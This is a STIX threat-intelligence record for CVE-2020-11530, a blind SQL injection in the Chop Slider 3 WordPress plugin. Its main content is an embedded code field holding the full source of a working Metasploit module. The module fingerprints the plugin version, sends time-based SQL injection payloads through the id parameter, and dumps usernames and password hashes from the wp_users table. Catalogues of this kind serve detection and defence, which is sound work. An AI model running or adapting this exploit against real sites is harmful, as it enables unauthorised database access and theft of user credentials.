{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--742aefef-c27e-4b3c-899d-0f0f6bbf4428",
    "created": "2024-08-14T16:29:54.276131Z",
    "modified": "2024-08-14T16:29:54.276135Z",
    "name": "WordPress ChopSlider3 id SQLi Scanner",
    "description": " The iDangero.us Chop Slider 3 WordPress plugin version 3.4 and prior contains a blind SQL injection in the id parameter of the get_script/index.php page.  The injection is passed through GET parameters, and thus must be encoded and magic_quotes is applied at the server. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/scanner/http/wp_chopslider_id_sqli.rb",
            "external_id": "wp_chopslider_id_sqli.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2020-11530"
        },
        {
            "source_name": "reference",
            "url": "https://seclists.org/fulldisclosure/2020/May/26"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::HTTP::Wordpress\n  include Msf::Auxiliary::Scanner\n  include Msf::Exploit::SQLi\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'WordPress ChopSlider3 id SQLi Scanner',\n        'Description' => %q{\n          The iDangero.us Chop Slider 3 WordPress plugin version 3.4 and prior\n          contains a blind SQL injection in the id parameter of the\n          get_script/index.php page.  The injection is passed through GET\n          parameters, and thus must be encoded,\n          and magic_quotes is applied at the server.\n        },\n        'Author' => [\n          'h00die', # msf module\n          'SunCSR', # edb module\n          'Callum Murphy <callum.a.murphy.77@gmail.com>' # full disclosure\n        ],\n        'License' => MSF_LICENSE,\n        'References' => [\n          ['EDB', '48457'],\n          ['CVE', '2020-11530'],\n          ['URL', 'https://seclists.org/fulldisclosure/2020/May/26']\n        ],\n        'Actions' => [\n          ['List Users', { 'Description' => 'Queries username, password hash for COUNT users' }],\n        ],\n        'Notes' => {\n          'Stability' => [CRASH_SAFE],\n          'Reliability' => [],\n          'SideEffects' => [IOC_IN_LOGS]\n        },\n        'DefaultAction' => 'List Users',\n        'DisclosureDate' => '2020-05-12'\n      )\n    )\n    register_options [\n      OptInt.new('COUNT', [false, 'Number of users to enumerate', 1]),\n    ]\n  end\n\n  def check\n    res = send_request_raw({\n      'method' => 'GET',\n      'uri' => target_uri.path\n    })\n    fail_with Failure::Unreachable, 'Connection failed' unless res\n    if res && res.body =~ /idangerous.chopslider-(\\d\\.\\d).css-css/\n      v = Rex::Version.new(Regexp.last_match(1))\n      print_status \"Version detected: #{v}\"\n      if v <= Rex::Version.new('3.4')\n        return Msf::Exploit::CheckCode::Appears\n      end\n    end\n    Msf::Exploit::CheckCode::Unknown\n  end\n\n  def run_host(ip)\n    unless wordpress_and_online?\n      vprint_error('Server not online or not detected as wordpress')\n      return\n    end\n\n    # this didn't come with a readme file\n    # checkcode = check_plugin_version_from_readme('chopslider', '3.4')\n\n    if check == Msf::Exploit::CheckCode::Unknown\n      vprint_error('ChopSlider3 version not vulnerable or undetected')\n      return\n    else\n      print_good('Vulnerable version of ChopSlider3 detected')\n    end\n\n    sliderid = Rex::Text.rand_text_numeric(8..10)\n\n    @sqli = create_sqli(dbms: MySQLi::TimeBasedBlind) do |payload|\n      if payload.include?(\"''\")\n        payload.gsub!(\"''\", 'hex(0x00)')\n      end\n\n      payload = Rex::Text.uri_encode(payload)\n      res = send_request_raw({\n        'method' => 'GET',\n        'uri' => \"#{normalize_uri(target_uri.path, 'wp-content', 'plugins', 'chopslider', 'get_script', 'index.php')}?id=#{sliderid}%20OR%20#{rand(0..10)}<>#{rand(11..1000)}%20AND%20#{payload}\"\n      }, 20, true)\n      fail_with Failure::Unreachable, 'Connection failed' unless res\n    end\n\n    unless @sqli.test_vulnerable\n      print_bad(\"#{peer} - Testing of SQLi failed.  If this is time based, try increasing SqliDelay.\")\n      return\n    end\n    columns = ['user_login', 'user_pass']\n\n    print_status('Enumerating Usernames')\n    un = @sqli.dump_table_fields('wp_users', [columns[0]], '', datastore['COUNT'])\n\n    print_status('Enumerating Password Hashes')\n    pass = @sqli.dump_table_fields('wp_users', [columns[1]], '', datastore['COUNT'])\n\n    un = un.zip(pass)\n\n    table = Rex::Text::Table.new('Header' => 'wp_users', 'Indent' => 1, 'Columns' => columns)\n    un.each do |user|\n      create_credential({\n        workspace_id: myworkspace_id,\n        origin_type: :service,\n        module_fullname: fullname,\n        username: user[0],\n        private_type: :nonreplayable_hash,\n        jtr_format: Metasploit::Framework::Hashes.identify_hash(user[1]),\n        private_data: user[1],\n        service_name: 'Wordpress',\n        address: ip,\n        port: datastore['RPORT'],\n        protocol: 'tcp',\n        status: Metasploit::Model::Login::Status::UNTRIED\n      })\n      table << [user[0][0], user[1][0]]\n    end\n    print_good(table.to_s)\n  end\nend\n",
    "x_mitre_disclosure_date": "2020-05-12"
}